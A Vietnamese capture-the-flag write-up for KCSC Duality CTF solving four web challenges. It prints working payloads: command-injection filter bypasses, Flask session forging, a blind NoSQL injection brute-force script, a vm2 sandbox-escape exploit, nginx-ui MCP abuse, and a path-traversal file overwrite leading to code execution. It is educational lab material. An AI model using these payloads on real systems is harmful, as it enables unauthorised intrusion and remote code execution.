---
title: "KCSC DUALITY CTF"
date: 2026-04-26
updated: 2026-11-18
description: "Writeup for KCSC Duality CTF, covering KCSC OS, KCSC-Sandbox, PaperTrail and Chatty."
tags: [CTF]
category: writeup
lang: vi
cover: /research/kcsc-duality-ctf/SJup0No6-e.png
coverAlt: "Screenshot from KCSC DUALITY CTF"
---
### KCSC OS
#### Phân tích
![image](/research/kcsc-duality-ctf/SJup0No6-e.png)
mô tả có nói đến user `kcsc` , để leo thang đặc quyền , có lẽ sẽ hữu ích
Sau khi vào chall , em thấy có chức năng input `name` , sau đó nó sẽ lưu biến name này vào memory của session.
![image](/research/kcsc-duality-ctf/SkhMWHo6be.png)
Sau đó em lấy session vừa có được đem đi decode tại jwt.io
![image](/research/kcsc-duality-ctf/S1kOZHiaZl.png)
Token này khá lạ , tại ko có `header` ( phần đầu tiên của JWT) , hơn nữa phần mã `json` kia cũng ko decode được , nhưng đúng thật là token này có chứa user 
![image](/research/kcsc-duality-ctf/SJwWXHop-l.png)
Còn 4 user nữa em cũng thử lần lượt , ngoài ra em cũng thử thêm chức năng note bằng việc fuzzing
```text
../../../../etc/passwd
{{7*7}}
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```
nhưng cũng chỉ reflect lại , không có thêm thông tin hữu ích gì .
Lúc này em thử ghé thăm src code xem có comment nào ko thì tại `/notes` , có chứa endpoint của tác giả về `SECRET_KEY`
![image](/research/kcsc-duality-ctf/rySWNSsa-x.png)
SECRET key này để random , em bắt đầu đi tra
![image](/research/kcsc-duality-ctf/SkPPEroaWe.png)
> Ồ vậy ra nó random có giới hạn , có thể brute force secret này được.

Nhưng mà nó để làm gì nhỉ , vì cái `token ` kia trông rất giống JWT , nhưng lại ko hẳn là JWT , em check là `session` thì thấy
```
Cookie: session=.eJyrVkrOTYnPyCwuyS-qVLKKjtVRyslPT09NiU8sUbJSMjIwMtM1MNE1MlMwMLcyNbAyNVIIDXFW0lHKyy9JLYZoKMlIzU0FKk7MTUotAkqVFgMpK5A5usn5OTmpyUCzlWoBugYgoQ.ae3D3A.tSolwHN-yWqsoqHPr7J7IKsIpEk
```
> Quái sao cái token này lại có `.` ở đầu nhỉ , em đi tra lại

![image](/research/kcsc-duality-ctf/H1Y8rro6We.png)
Ồ hóa ra nó là loại token dc tạo bởi `flask` và secret_key kia là để sign và tạo ra session mới theo ý mình
em bắt đầu đi tìm tool để decode cái mã này , và em tìm thấy https://github.com/Paradoxis/Flask-Unsign
em tải nó về và kí thử 
![image](/research/kcsc-duality-ctf/ry_uLBspbx.png)
Ồ vậy là chuẩn rồi .
Tiếp theo còn cái secret_key nữa , nó chỉ có `32768` trường hợp nên có thể brute-force được
Nhưng mà làm sao để lưu 32k số vào 1 file nhanh nhỉ , em bắt đầu search 
![image](/research/kcsc-duality-ctf/H16GDria-l.png)
> Ồ cũng dễ , em sẽ lưu từ 0 -> 32768 vào secret.txt

Tiếp theo là brute-force
```
flask-unsign --sign --cookie ".eJyrVkrOTYnPyCwuyS-qVLKKjtVRyslPT09NiU8sUbJSMjIwMtM1MNE1MlMwMLcyNbAyNVIIDXFW0lHKyy9JLYZoKMlIzU0FKk7MTUotAkqVFgMpK5A5usn5OTmpyUCzlWoBugYgoQ.ae3D3A.tSolwHN-yWqsoqHPr7J7IKsIpEk" --secret
```
sau khi thêm `--no-literal-eval` em đã tìm dc secret key = `30809`
![image](/research/kcsc-duality-ctf/BkYqdrjp-g.png)
Tiếp theo là generate cái mới
```
flask-unsign --sign --cookie "{'cmd_history': [], 'logged_at': '2026-04-26 07:50:52 UTC', 'notes': [], 'theme': 'amber', 'user': 'log-collector'}" --secret '30809' --no-literal-eval
```
Sau đó thay vào cookie , nhưng vẫn chưa mở được chức năng `whoami`
![image](/research/kcsc-duality-ctf/B1voYBjaZx.png)
Là sao nhỉ , sau một hồi thay ác user khác nhau thì đột nhiên em nhớ ra user `kcsc` mà đề bài có nhắc , em bắt đầu tạo lại và đã vào được , em cứ tưởng giờ chỉ cần cat flag nữa là được nhưng ko , nó filter hầu hết các lệnh os nguy hiểm
![image](/research/kcsc-duality-ctf/HJir9SiTZe.png)
Sau một hồi lục lọi thì em tìm được một vài thứ còn sống như `env` , `export` , `.` , `-` , `$a` nhưng cũng không giúp em bypass được
Sau một hồi thử nhưng đều thất bại em đã xin hint và được anh `Truong Tran ` hint là tìm xem thằng nào ko bị filter và tận dụng nó để bypass . Em bắt đầu đi search các cách bypass
em tìm thấy cách bypass khá hay
![image](/research/kcsc-duality-ctf/rJQq3Hoabx.png)
tại [Link](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/web-application-attacks/command-injection/bypassing-blacklisted-commands)
Vì `$` được sử dụng nên em đi thử `who$@ami` nhưng keyword `@` lại bị block , em thử đổi qua `$1` thì lại bypass thành công
![image](/research/kcsc-duality-ctf/HyYfaSoT-l.png)
>YESSS
#### Khai thác
Nhưng vấn đề tiếp theo là `" "` - space lại bị filter , em lại đi search cách bypass space thì chỉ có dùng `{IPS}` , nhưng dấu `{` lại bị filter mất rồi
Sau một hồi tìm kiếm em tìm được ở [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) với rất nhiều cách bypass space và bắt đầu fuzzing tất cả payload thấy có thể bypass space với việc dùng `%09` - tab character , em bắt intercept trên burp suite và input  `l$1s%09/` - để tránh việc bị encode 
![image](/research/kcsc-duality-ctf/SJsBArs6Wx.png)
Ồ flag đây rồi nhưng mà nó dài quá
em thử xem mình đanh đứng ở đâu `pwd` thì em đang đứng ở trong `app` , vậy là phải nhảy `../` thì mới ra được mục chứa flag . Đến đây vấn đề lại xuất hiện khi em muốn dùng `grep` để bắt flag cho đơn giản
![image](/research/kcsc-duality-ctf/rkev1LiTWg.png)
Nhưng lại exec fail , là sao nhỉ.
Làm sao để vào được flag.txt kia mà ko bị limit lenghth huhu , thiên đường ngay trước mắt rồi mà không vào được
Rồi em lại xách đít đi search `short way to read file` và sau cả tiếng đồng hồ tìm thì em tìm được cách mở file nhanh chóng chỉ với `. /file.txt` dù đang ở bất kì thư mục nào
Đây là dạng `Error-based Leak` , có thể xem file qua việc thông báo lỗi , ép shell thực thi file text
![image](/research/kcsc-duality-ctf/BksfmdsTZe.png)
PAYLOAD:
`.%09/fl$1ag-OzDFBRIJSWkTCTdqUSZJbVcxotJhMPbY.t$1xt`
![image](/research/kcsc-duality-ctf/HJNZHLoaZg.png)
flag:
```
KCSC{c0_ch0_c0_m30_n94y_n40_cun9_vu1}
```
### KCSC-Sandbox
#### Phân tích
![image](/research/kcsc-duality-ctf/SJyG2snTZl.png)
> Bài này lúc thi e làm không kịp huhu

Đây là một bài dạng vượt sanbox , nhưng trước tiên cần lên dc phase admin
Đọc qua src code em thấy server có chạy `mongodb` khả năng cao là lại `NoSQLi` 
![image](/research/kcsc-duality-ctf/Hkl7g6on6bl.png)
Ghé qua phần `db.js` thì e thấy ko có gì đặc biệt , nó chỉ lưu lại việc tạo admin user
Phần `env.js` Thì rõ ràng hơn , nó cho em biết admin không tên là admin , mà dc tạo random 
![image](/research/kcsc-duality-ctf/ByUj6s2a-g.png)
Và phần quan trong nhất đó là `apiController` , tại đây chứa các logic của bài
![image](/research/kcsc-duality-ctf/rkZSRohaWl.png)
Ở đây có chứa các hàm sanitizing input user sau khi đi qua `isNonEmptyString` để làm sạch đầu vào ( string require) , sang `toTrimmedString` nó kiểm tra lần nữa , nếu ko phải String sẽ trả `null` , hmmm có lẽ hàm này để anti object của Nosql , vì nó rơi vào nhánh `null` , hàm `resetToken` cũng santi khá chặt
![image](/research/kcsc-duality-ctf/B1iYbnh6-g.png)
Tại `Logic Login` , dù là có `Findone()` , nhưng đã bị santize trước khi vào , dẫn đến việc result trả `null` , và NoSQLi fail
> Điều này tương tự đối với logic `forgotPassword` và `resetPassword`

Nhưng đến với hàm `searchUsername` có vẻ là quên xài `toTrimmedString` để santize
![image](/research/kcsc-duality-ctf/HkvYz3haWe.png)
> -> Có thể NoSQLi tại đây

Bước vào chall , em thấy có 2 options là search user và shell-sanbox , cái shell kia chắc phải lên admin mới vào được . Tính năng `search user` cho em nhập trực tiếp câu `query`

![image](/research/kcsc-duality-ctf/Sy_27h3pZl.png)
Nó trả `admin` nhưng role lại là `user`:)) , role admin thât chắc phải là cái random kia
Tiếp theo em bắt requestl để  chèn `NoSQLi`
```json
{"username": {"$ne": null}
```
Nó trả về các user đã được tạo , trong đó có admin `duc193_XBQ5sA9N`
![image](/research/kcsc-duality-ctf/Syc6Vn36-e.png)
#### Stuck
Lúc đi thi là đoạn này em bị stuck vì sau khi tìm được admin em lại đi lấy id và user để craft ra một `JWT` để lên admin cho nhanh . Vì em thấy những hàm như `login` , `resetPassword` , `forgotPassword` thì đều ko dính NoSQLi , và pass của admin khá dài , tận 24 kí tự nên em ko nghĩ đến chuyện brute-force. Em bị kẹt ở đoạn này rất lâu , sau đó chán quá nên em đi viết wu:') . Mãi lúc thi xong em hỏi bạn `An AT22` , thì bạn bảo xem kĩ lại phần `resetPassword` , `forgotPassword` . Xong lúc về em xem lại thì mới ngớ ra là có thể dùng cái `Nosqli` bên search user để `brute-force` pass của resetToken qua blind NoSQLI. 
Vì cái search user chỉ trả về 2 trạng thái: nếu `đúng` thì trả về `admin` , sai thì `count = 0` . Lợi dụng việc đó ta có thể brute-Force bằng cách thêm trường `resetToken` vào
```json
{"username": "duc193_XBQ5sA9N",
"resetToken":{"$regex": "^%s"}
}
```
Sau đó em có tìm dc đoạn script brute tại [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md#tools)
Tinh chỉnh lại vì resetToken chỉ gồm 24 kí tự ( a->f , 0->9)
Đầu tiên là lấy resetToken sau đó chạy script sau:
```python
import requests
chars = "0123456789abcdef"
password=""
url="http://67.223.119.69:3639/search-username"
headers={'content-type': 'application/json'}

for i in range(24):
    found = False
    for char in chars:
        payload = {
            "username": "duc193_XBQ5sA9N",
            "resetToken":{"$regex": f"^{password}{char}"}
        }
        try:
            res = requests.post(url , json = payload)
            if 'duc193_XBQ5sA9N' in res.text:
                password += char
                print(f"ký tự thứ {i+1}: {password}")
                found = True
                break
        except Exception as e:
            print(f"Lỗi {e}")
            exit()
print(f"Token:{password}")
```
> f3b63aa6757af6155c37ec52
#### VM2
Sau đó đổi pass và lên admin
![image](/research/kcsc-duality-ctf/ryiceanaWe.png)
Tại sanbox , em thấy nó chạy Javascript
rà lại một loạt src code rm thấy nó là `vm2` và version `"vm2": "3.10.0"` đến đấy em đi tra `Escape sanbox vm2 3.10.0` thì có rất nhiều , sau một lúc thì em tìm được bài này [Link](https://www.endorlabs.com/learn/cve-2026-22709-critical-sandbox-escape-in-vm2-enables-arbitrary-code-execution)
ứng với version 3.10.1 << , nhưng em lại `đần quá` đi copy hết cả phần run code vào
```javascript
const { VM } = require("vm2");

const code = `
// Step 1: Create an Error with a Symbol name to trigger special handling
const error = new Error();
error.name = Symbol();

// Step 2: Create an async function that accesses error.stack
// The return value is a globalPromise, not a localPromise
const f = async () => error.stack;
const promise = f();

// Step 3: Attach a .catch() handler to the globalPromise
// This triggers globalPromise.prototype.catch which uses .call()
promise.catch(e => {
    // Step 4: If Function.prototype.call is intercepted, the error 'e'  may be an unsanitized host Error object
    const Error = e.constructor;
    const Function = Error.constructor;
    
    // Step 5: Use the Function constructor to execute arbitrary code
    // in the host context, completely escaping the sandbox
    const f = new Function(
        "process.mainModule.require('child_process').execSync('id', { stdio: 'inherit' })"
    );
    f();
});
`;

new VM().run(code);
```
xong cứ bị văng lỗi `require not define` , lúc này em cứ tưởng là tác giả ác đến nỗi xóa bớt hàm đi để `CVE ko match` cơ . Sau một thời gian tìm hiểu thì em mới biết trong src code đã định nghĩa sẵn `const { VM } = require("vm2");` và cái em cần chạy là dòng chữ màu xanh bên trên . Rồi copy phần xanh và chạy lại thì lại nhận được `(no output)` ơ là sao nhỉ . Bí quá em hỏi gpt  thì e biết được là cái đoạn trên nó chỉ trả output qua `Node.js` trức tiếp trên terminal qua `{ stdio: 'inherit' }` , còn để output hiện trên http respone và dùng try thay cho promise để catch lỗi , dùng return để trả output ra màn hình
```javascript
const error = new Error();
error.name = Symbol();
const f = async () => error.stack;
f().catch(e => {
    try {
        const hostFunction = e.constructor.constructor;
        const process = hostFunction("return process")();
        
        return process.mainModule.require("child_process").execSync("cat /flag.txt").toString();
    } catch (err) {
        return "Lỗi RCE: " + err.message;
    }
});
```
```
KCSC{n0sql_1nj3ct10n_bl1nd_4nd_vm2_3sc4p3_1s_s0_34sy}
```
### PaperTrail
![image](/research/kcsc-duality-ctf/ryGn3zpTbl.png)
#### Phân tích
Khi mới mở src code lên thì em thấy trong docker có khá nhiều thông tin 
![image](/research/kcsc-duality-ctf/HJyy0fTpbx.png)
Trước hết là webroot là `/var/www/html` và dir của `flag` là `/opt/papertrail`
Và nối tiếp là việc setup `nginx ui ` khá dài , đoạn cuối em `catch` được là `flag_name` nó là một {uuid}.txt chứ ko phải flag.txt như bình thường . Và em cũng biết được version của thằng `nginx ui` là `2.3.3`
Do em không biết về cái `nginx ui` này nên đọc mấy file config em không hiểu mấy :') .
Đi tiếp lên phần `download.php`
![image](/research/kcsc-duality-ctf/BksjrXppWe.png)
Tại biến `$file` , nó sẽ lấy cái giá trị nó dc truyền vào như ở đây mặc định là `cards/starter-pack.png` , sau đó nó sẽ dc đem đi santi qua 2 lớp
- Đầu tiên là `/^[a-zA-Z0-9._\/-]` , tại đây nó chỉ cho phép các kí tự đơn giản -> hạn chế url-encoding
- Tiếp theo là việc ban `../` cũng như `..` -> ngăn chặn `pathtraversal`
- Nếu qua được hàm này thì nó sẽ dc gán cho biến `$path` , tại đây nó được gán chặt `/` vào đầu file path
ở đoạn cuối em thấy phần này
![image](/research/kcsc-duality-ctf/HkLNPm6abl.png)
> Đây chính là điểm để render các file , dẫn đến path traversal

Vậy là bài này anti pathtraversal nhưng vẫn read được nếu dùng đường dẫn tuyệt đối
Em tìm thấy thêm được điểm trigger ở đây
![image](/research/kcsc-duality-ctf/BJrMOXaabx.png)
```
67.223.119.69:3651/download.php?file=/etc/passwd
```
nhưng nó lại báo `file not found` , có vẻ e đang nằm ở tầng thấp , ko đứng cùng thư mục với /etc/passwd . Sau đó một thời gian em thử thì đa số đều `not found` , em thử tìm cách bypass pathtraversal nhưng đều bị `ban` hoặc là `not found` . Sau đó em nghịch với một bài cái webroot thì ra được
```
/var/www/html/index.php
/var/www/html/admin.php
/var/www/html/render.php
```
Nhưng cũng chỉ có src code của mấy file này - đã có sẵn trong mã nguồn của bài nên cũng ko cần thiết lắm . Rồi em lục lọi lại mã nguồn để tìm em có file hint nào ko
![image](/research/kcsc-duality-ctf/H1g_tm6TWl.png)
> Ở đây có những `{{` nhưng lại ko có engine nào nên e bỏ qua hướng `ssti`

Sau khi lục tung hết src code lên thì cuối cùng em cũng tải về được một file khá bí ẩn 
`/etc/nginx-ui/app.ini` 
Trong file này nó chứa rất nhiều thứ như
```
[node]
SkipInstallation     = true
Name                 = 
Secret               = cf7f5999-b7f7-4337-85da-cf8e843f07ed
JwtSecret = 6f3e6527-df15-4a79-91aa-2e9fb41573a9
```
Nhưng lúc này em lại chưa biết mấy cái này để làm gì , sau đó em nhảy qua phần `admin.php` xem leo lên như nào thì em thấy có phần `$gatePath = '/etc/nginx-ui-managed/admin-access.on';` cái này khá lại , ban đầu em còn tưởng là file nào đó chứa secret để lên admin cơ , nhưng em read thì lại `not found` . Sau khi em đi search thì em mới biết nó đóng vai trò như `công tắc`  , nếu bật lên thì user có thể truy cập vào được còn nó ko bật ( chưa dc tạo) thì sẽ trả mã lỗi `403`.

Rồi em được release Hint là `CVE` , thế là em tức tốc bỏe ngay và đi search các CVE liên quan đến `NGINX_UI_VERSION=v2.3.3` thì em tìm được một CVE khá match là `CVE-2026-33032` nó có liên quan đến 2 path trong phần config là `/mcp` và `/mcp_message` . Nhưng tại `/mcp_message` của nó lại ko cần `Auth`
và họ có thể chèn access vào `port 9000` qua `/mcp_message` .
Nhưng khi em truy cập vào thì lại báo missing `sessionId` ơ thế là mình ko tìm đúng CVE sao , em bắt đầu rà soát lại các CVE khác liên quan đến `nginx ui` thì cũng chỉ thấy có cái này là giống . Đến đây là em bị stuck và không kịp giải chall này.
Sau đó thì em được anh `Khiem AT21` hint cho là đi tìm hiểu về `nginx ui` , thế là em đi đọc và đọc đến phần `MCP module` , em thấy có thể truy cập qua `node_secret` 
```
http://localhost:9000/mcp?node_secret=<your_node_secret>
```
cái này quen quen hình như em thấy nó ở đâu rồi , em mở lại cái file .init kia và tìm thấy đúng cái node_secret , em thay vào 
```
http://67.223.119.69:3651/mcp?node_secret=cf7f5999-b7f7-4337-85da-cf8e843f07ed
```
thì lại bị báo 
```
{"message":"Authorization failed"}
```
Ơ là sao nhỉ , rõ là node_secret mà sao ko được , sau đó em đọc lại cái docs kia
![image](/research/kcsc-duality-ctf/rJDmJN6aZl.png)
> Ở đây nó bảo là có thể dùng `nodeSECRET` để accesss các API , nhưng nó có cảnh báo là cái này đã bị loại bỏ từ bản` v.2.0.0` mà chall này thì lại là `v.2.3.3` tự nhiên em lại overthinking là hay là cái `node_secret` kia nó bị thay rồi nhỉ 

Rồi em bắt đầu để ý đến cái JWT
![image](/research/kcsc-duality-ctf/BkobgVaabe.png)
> Ở đây nó bảo có thể dùng JWT để logs in user , tự nhiên em lại nghĩ đến việc dùng `JWT` forge ra cái cookie và log vào `/mcp` , sau đó lấy `sessionId` để đăng nhập vào `/mcp_message`

Nhưng rồi thử mãi cũng đều trả `403` lúc này em bất lực quá rồi , xong a `Khiêm` có bảo target vào cái `mcp` em mới ngộ nhận ra mình đi hơi xa sang những cái khác
Thế nhưng nãy em có thử rồi nó vẫn trả `403` mà , có match đâu nhưng em nghĩ chắc mình sai ở bước nào đó hay cái `node_secret` mà hôm thi mình tải về nó là bản lỗi? 
Rồi em đi tải cái `app.init` mới về thì TRỜI nó thay đổi mỗi `instant` bảo sao dù em có nhập thì nó cũng chỉ báo `403` và ko vào được huhu . 
Đến đây thì mọi thứ đã sáng tỏ , em thay cái `node_secret` mới vào thì có sessionId luôn huhu
```url
/mcp_message?sessionId=58449890-80b7-49df-92d9-171bf7b49684
```
#### Khai thác
Try cập vào để bật `admin-access.on` thôi , em xem lại cái CVE kia thì thấy người ta dùng để truy cập vào local:9000 , nhưng em k cần cái đó , nên em sửa lại chút
```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "nginx_config_add",
    "arguments": {
      "name": "/etc/nginx-ui-managed",
      "content": "admin-access.on"
    }
  }
}
```
> nó báo `Accepted` , nhưng vào admin.php thì vẫn chưa được . Em thử qua cổng /mcp thì không thấy log gì

Sau đó em đi tìm hiểu thì đọc được ở bài viết [NÀY](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) cách dùng , em thử với `"method":"tools/list"` thì được khá nhiều `params`
![image](/research/kcsc-duality-ctf/HykTHNppZe.png)
Trong đó có trường này có dùng trong CVE chắc là để thêm config
sau đó em có tìm hiểu thêm về trường này thì thấy có một CVE viết khá đầy đủ [Link](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h6c2-x2m2-mwhf)
```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "nginx_config_add",
    "arguments": {
      "name": "admin-access.on",
      "content": "open",
      "base_dir": "",
      "overwrite": true,
      "sync_node_ids": []
    }
  },
  "id": 1
}
```
![image](/research/kcsc-duality-ctf/H1bfdVTpZx.png)

>SUCCESSS

Sau là RCE với ping vì trong src có sử dụng `shell_exec` mà k santi input , em chỉ cần `;` là có thể RCE
Nhưng vấn đề là làm sao để tìm file flag kia , giờ mà `grep "KCSC"` thì nó sẽ ra rất nhiều file , sau một lúc thử thì em tìm được cách mở file nhanh chóng với `find . -type f -name "*.txt" -exec cat {} + 2>&1`

CRAFT lại
```bash
ping -c 4 127.0.0.1; cd /opt/papertrail; find . -type f -name "*.txt" -exec cat {} + 2>&1
```
FLAG
```flag
KCSC{ng1nx_UI_wH1sp3R3d_n0d3_s3Cr3t_n_MCP_0p3N3d_tH3_d00R_2_Th3_r3St_0F_tH3_m3Ss_f3fe151924231b04d1}
```
### Chatty
![image](/research/kcsc-duality-ctf/ByHJA41Abl.png)
#### Phân tích
Vào src code xem thì em thấy phần server được viết bằng `golang` , đây là ngôn ngữ em chưa biết syntax nên có thể một số chỗ còn chưa đúng lắm :')
TRước hết vào Dockerfile cho ta đường dẫn của flag `RUN gcc -O2 -s -o /readflag flag.c` nằm ở `/readflag` . Sau khi đọc lướt cấu hình của server , em thấy có cấu hình bot , lúc đầu em tưởng là sẽ đi mượn cookie của con bot sau đó là nhờ nó đi lấy flag cơ , nhưng không phải thế.
Đọc qua 2 file `auth_handler` và `auth` thì em thấy không có gì , phần đăng nhập khá chặt chẽ và mỗi lần đăng nhập thành công ta sẽ có được 1 token , lúc này do em đọc ẩu quá với lại do cú pháp cũng hơi khó hiểu nên em đọc `miss` đoạn quan trọng của phần `bot.go` 
Nhiều file quá nên em nhảy sang `main.go` đọc xem nó đang làm những gì , thì e thấy sẽ được random sau mỗi lần `spawn` room `news` rồi bên dưới cũng không có gì .
Tại websocket , em thấy có hàm `sanitizeAttachment` đây là hàm làm sạch đầu vào của file path 
![image](/research/kcsc-duality-ctf/rkMJvLkAWg.png)
Ngoài ra ở file handle cũng có
![image](/research/kcsc-duality-ctf/BkjDaU1A-l.png)

> Cái này là để chặn pathtraversal rồi

Sang file cấu hình `bot.py` thì em thấy con bot này giao tiếp với server qua websockets 
![image](/research/kcsc-duality-ctf/Syp_w8k0We.png)
> Tại đây thì con bot sẽ lấy các bài viết bên config.json , truy cập vào bài viết rồi lấy random nội dung và hiện trong room `news`

#### Ý tưởng
Sau khi đọc xong phần này , ý tưởng của em là làm sao để con bot nó feed được bài của mình , em bắt đầu vào chall và ném cho nó link webhook , nhưng con bot nó lại ko care e , tại đây có chức năng upload ảnh , sau khi upload xong thì em xem lại được đường dẫn của ảnh đó .
![image](/research/kcsc-duality-ctf/HJyzqU1A-l.png)
> `data/uploads/00000000-0000-0000-0000-000000000001/shell.jpg`
- Em định sẽ upload file `.php` để RCE nhưng nhận ra bài này không viết bằng php nên em mở path của ảnh này thì không có gì 

Lúc này bí qua nên em mò lại src code và cố gắng hiểu những hàm lạ mà em đã bỏ qua . Sau một lúc thì em đọc lại file quan trọng đó là `bot.go` để hiểu rõ tại sao con bot nó lại ko care
![image](/research/kcsc-duality-ctf/BkxVPsI1R-x.png)
Tại đây mỗi lần con bot spawn thì nó sẽ `exec` lệnh này
![image](/research/kcsc-duality-ctf/SJA3pUJCZx.png)
> Ở đây ta có thêm hàm restart bot , mỗi khi con bot bị crash

Đến đây thì em vẫn chưa hình dung được nên khai thác như nào , mục tiêu của em là muốn ghi vào file `config.json` bằng các sửa lại qua đoạn upload file , thế nhưng vấn đề là path của nó đã bị hàn phần `/upload/room-id/` vào đầu rồi , muốn ghi thì phải `path traversal` ra root thì mới ghi đè lên file được . Nhưng nãy giờ có 2 hàm anti pathtraversal khá chặt như trên em có kể
Rồi trong lúc đọc phần handle , em tự nhiên thấy có cái custume header `X-Room-Id` trông khá lạ , nên em thử focus đọc thử xem nó làm cái gì thì em phát hiện
![image](/research/kcsc-duality-ctf/SJEYxPJR-g.png)
 Ở đây header `X-Room-id` được lấy trực tiếp và join thẳng vào path mà ko qua `santiii` , điều này có nghĩa là vẫn có thể path traversal được , nhưng không phải là qua url mà là qua header
 Sau đó em thử sửa `X-Room-Id: ../../../etc/passwd` nhưng lại `Failed to create directory` , em xem lại src code xem thẳng nào xử lí đoạn này thì phần `target dir` được create mới n nên ko create ra được `/etc` .
 ![image](/research/kcsc-duality-ctf/HyJR_D1AWe.png)
 ### POC
 Em sẽ thử ghi một file vào `/web` 
 ![image](/research/kcsc-duality-ctf/H1D9ow10bl.png)
![image](/research/kcsc-duality-ctf/H17osDkAWg.png)
> Ghi thành công lên webroot

Bây giờ em sẽ tiến hành ghi đè lên file config kia với mục đính làm crash con bot vì trong logic khi `load_config` ko hề có lệnh `try - except` nào liên quan đến việc load_config bị lỗi
`cmd := exec.Command("python", "bots/news_bot/bot.py")` đây là cách để leo lên RCE 
vì `cmd` này sẽ luôn được tự động gọi mỗi khi tiến trình của con bot bị kill , và con bot mới được spawn
 sau mỗi 5s khi bị crash
```go
time.Sleep(5 * time.Second)
	s.spawnBot()
```
![image](/research/kcsc-duality-ctf/HkZyJ_yCWg.png)
> Ghi file bot mới , đoạn này em phải ghi nhanh không hết 5s là con bot mới lên nó sẽ dùng lại cấu hình cũ

Sau đó thay lõi của bot.py
```python
import subprocess
cmd = "ls /"
output = subprocess.getoutput(cmd)
with open("data/uploads/flag.txt", "w") as f:
    f.write(output)
```
![image](/research/kcsc-duality-ctf/HyvO1_yRbe.png)

![image](/research/kcsc-duality-ctf/r1oIld1CWe.png)
> RCEEE

cuối cùng là đọc flag , nhưng flag lại ko phải file text mà là binary , cần thông dịch c để có output , nên em chỉ cần dùng getoutput("/readfile") để exfiltration data
```python
import subprocess
output = subprocess.getoutput("/readflag")
with open("data/uploads/flag.txt", "w") as f:
    f.write(output)
```
FLAG
```
KCSC{aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQ==}
```
> flag này ko đem decode thì hơi phí =))
